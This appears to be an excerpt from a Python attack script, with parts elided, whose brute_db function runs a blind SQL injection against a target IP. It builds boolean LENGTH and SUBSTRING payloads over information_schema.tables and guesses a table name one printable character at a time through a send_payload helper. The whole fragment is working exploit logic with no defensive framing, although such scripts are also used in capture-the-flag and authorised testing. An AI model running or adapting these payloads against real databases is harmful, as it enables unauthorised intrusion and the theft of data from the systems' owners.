...
def brute_db(ip):
    ...
    for i in range(1, 100):  # Start from 1 to avoid zero-length check
        payload = f"LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0))={i}"
    ...
    for i in range(1, length + 1):
        for j in range(32, 127):  # ASCII printable characters
            payload = f"SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0), {i}, 1)='{chr(j)}'"
            if send_payload(ip, payload):
                db_name += chr(j)
